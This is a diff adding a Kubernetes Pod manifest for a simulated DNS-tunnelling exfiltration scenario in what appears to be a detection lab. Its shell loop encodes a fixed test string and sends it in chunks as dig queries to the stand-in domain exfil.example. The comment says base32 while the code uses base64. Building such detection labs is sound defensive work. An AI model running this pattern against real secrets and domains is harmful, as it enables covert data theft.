@@ -1,0 +1,43 @@
+# Scenario 4: DNS tunnelling / exfiltration.
+#
+# Technique: T1048.003. Rule: dns_exfil.
+#
+# SIMULATION: queries go to *.exfil.example, which does not resolve, and the
+# namespace NetworkPolicy permits only the cluster DNS resolver. The data
+# "exfiltrated" is a fixed test string, base32-encoded into hostnames the same
+# way real DNS tunnelling tools do it - which is what makes the encoded payload
+# recoverable from the resolver's memory buffers in the capture.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: dns-exfil
+  namespace: victim
+  labels:
+    app.kubernetes.io/part-of: flight-recorder-lab
+    scenario: dns-exfil
+  annotations:
+    flight-recorder.io/scenario: "T1048.003 exfiltration over DNS"
+spec:
+  restartPolicy: Never
+  terminationGracePeriodSeconds: 0
+  containers:
+    - name: tunnel
+      image: alpine:3.20
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          apk add --no-cache bind-tools >/dev/null 2>&1 || true
+          SECRET="FLIGHT-RECORDER-SCENARIO-DNS-EXFIL-PAYLOAD"
+          ENCODED=$(echo -n "$SECRET" | base64 | tr -d '=' | tr '+/' '-_')
+          echo "simulating dnscat-style tunnelling of $SECRET"
+          for chunk in $(echo "$ENCODED" | fold -w 40); do
+            dig +short +time=1 +tries=1 "${chunk}.exfil.example" TXT || true
+          done
+          sleep 4
+      securityContext:
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop: ["ALL"]
+      resources:
+        requests: { cpu: 10m, memory: 32Mi }
+        limits: { cpu: 200m, memory: 128Mi }
